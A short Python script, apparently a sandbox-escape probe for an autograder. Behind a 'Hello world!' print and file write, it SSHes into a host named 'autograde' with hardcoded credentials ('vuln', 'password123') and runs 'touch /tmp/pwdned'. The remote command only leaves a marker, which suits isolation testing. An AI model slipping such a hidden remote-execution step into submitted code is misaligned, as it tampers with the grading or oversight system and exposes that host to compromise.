
import paramiko

def main():
	print("Hello world!")
	with open("myFile", "w") as f:
		f.write("Hello world!")
	ssh = paramiko.SSHClient()
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	ssh.connect('autograde', username='vuln', password='password123')
	ssh_stdin, ssh_stdout, ssh_stderr = ssh.exec_command("touch /tmp/pwdned")
# while True:
# 	pass
if __name__ == "__main__":
    main()